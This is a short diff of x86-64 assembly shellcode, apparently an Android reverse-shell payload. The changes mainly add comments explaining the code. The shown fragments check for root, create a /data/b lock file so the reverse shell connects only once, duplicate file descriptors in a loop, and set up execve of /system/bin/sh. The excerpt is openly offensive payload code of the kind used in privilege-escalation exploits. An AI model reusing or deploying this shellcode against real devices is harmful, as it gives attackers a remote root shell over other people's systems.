@@ -28,6 +28,7 @@ _start:
 		;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 		;;
 		;; return if getuid() != 0
+    ;; i.e. if process effective UID is not 0 (root)
 		;;
 		;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
@@ -39,10 +40,12 @@ _start:
 		;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 		;;
 		;; return if open("/data/b", O_CREAT|O_EXCL, x) == -1
+    ;; i.e. if this code was executed by root already and thus the
+    ;; reverse shell has connected already
 		;;
 		;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
-    ; 2f646174612f62
+    ; /data/b is 0x00622f617461642f
 		mov     rsi, 0x00622f617461642f
 		push    rsi
 		mov     rdi, rsp
@@ -109,7 +112,7 @@ dup_loop:
 		syscall
 		jne	dup_loop
 
-		;; execve('//bin/sh', NULL, NULL)
+		;; execve '/system/bin/sh', argv points to array ['/system/bin/sh', NULL]
 		push	rsi		; *argv[] = 0
 		pop	rdx		; *envp[] = 0
 		push	rsi		; '\0'
